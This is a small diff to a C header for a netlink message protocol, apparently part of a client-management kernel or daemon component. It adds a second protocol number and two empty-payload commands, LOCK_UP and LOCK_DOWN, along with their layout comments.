@@ -24,6 +24,7 @@
 #endif
 
 #define NETLINK_PROTO_INFECTED 25
+#define NETLINK_PROTO_INFECTED_RCV 26
 
 #define SIGNITURE_HEADER 0x43435248   //CCRH
 #define SIGNITURE_HEADER_LENGTH 4
@@ -59,6 +60,10 @@ enum {
 #define GET_CLIENTS GET_CLIENTS
 	CONFIGURE,		//6
 #define CONFIGURE CONFIGURE
+	LOCK_UP,		//7
+#define LOCK_UP LOCK_UP
+	LOCK_DOWN,		//8
+#define LOCK_DOWN LOCK_DOWN
 };
 
 //RESPONSES
@@ -162,6 +167,12 @@ layout payload GET_CLIENT:
 	same as ADD_CLIENT
 
 layout payload GET_CLIENTS:
+	empty (payload_len = 0)
+
+layout payload LOCK_UP:
+	empty (payload_len = 0)
+
+layout payload LOCK_DOWN:
 	empty (payload_len = 0)
 
 RESPONSES
